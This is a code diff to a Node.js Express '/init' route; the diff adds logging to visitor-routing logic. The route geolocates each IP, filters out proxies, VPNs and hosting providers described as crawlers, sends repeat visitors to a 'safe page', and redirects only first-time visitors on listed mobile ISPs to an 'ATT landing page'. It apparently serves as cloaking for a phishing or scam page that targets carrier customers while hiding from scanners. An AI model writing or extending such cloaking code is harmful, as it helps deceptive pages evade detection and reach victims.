@@ -149,11 +149,13 @@ app.get('/init', async (req, res) => {
     }
 
     let clientIp = req.ip;
+    console.log(`[Init] Visit from IP: ${clientIp}`);
     
     // Check if user has already visited the ATT landing page
     const visitedIps = await getVisitedIps();
     const isVisited = visitedIps.some(entry => (typeof entry === 'object' ? entry.ip : entry) === clientIp);
     if (isVisited) {
+        console.log(`[Init] IP ${clientIp} already visited. Redirecting to safe page.`);
         return res.json({ redirect: NON_ATT_LANDING_PAGE });
     }
 
@@ -161,8 +163,9 @@ app.get('/init', async (req, res) => {
     try {
         const response = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`);
         data = response.data;
+        console.log(`[Init] ISP Lookup:`, data);
     } catch (error) {
-        console.error('ISP lookup failed:', error.message);
+        console.error('[Init] ISP lookup failed:', error.message);
     }
 
     // Security: Filter out proxies, VPNs, and Hosting providers (crawlers often use these)
@@ -194,8 +197,13 @@ app.get('/init', async (req, res) => {
     if (data && data.status === 'success' && !isSuspicious) {
         const userISP = (data.isp || data.org || "").toUpperCase();
         if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
+            console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page.`);
             targetUrl = '/go-att';
+        } else {
+            console.log(`[Init] No ISP match for: ${userISP}`);
         }
+    } else {
+        console.log(`[Init] Redirecting to safe page. Status: ${data?.status}, Suspicious: ${isSuspicious}`);
     }
 
     res.json({ redirect: targetUrl });
